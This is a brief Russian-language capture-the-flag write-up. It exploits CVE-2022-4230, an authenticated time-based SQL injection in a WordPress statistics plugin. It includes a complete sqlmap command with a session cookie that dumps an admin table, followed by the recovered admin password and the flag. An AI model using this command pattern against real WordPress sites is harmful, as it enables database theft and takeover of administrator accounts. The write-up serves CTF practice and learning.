# Private Data
WPscan находит CVE-2022-4230 - Authenticated SQLi
https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312
[CVE-2022-4230](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4230)

Это time-based sql-инъекция. Входим как пользователь, копируем cookie, с помощью sqlmap получаем дамп таблицы users_admin:
`sqlmap -u "http://79.143.25.24:8157/wp-json/wp-statistics/v2/metabox?_wpnonce=793f29b36e&name=words&search_engine=aaa" --cookie="wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_5c9a5ae5ff32de1df9ed609e50a578ec=sec1337%7C1679554865%7CIxMU00E2SmRP92aBRQ9KS8oY7f6ExjBpq2gc1baqbAC%7C18bb4437d379cc313bc7f8a7bea657ffc57b597af2d15044a35c9a25b6562c19" -p search_engine -D wordpress -T users_admin --dump`

admin : Jrkvf!mYcLtTZcjW8d

Входим в wordpress как админ, видим пост с флагом

Флаг - deteact{ce67481ba2558f06be3f4ce71fc67c4f}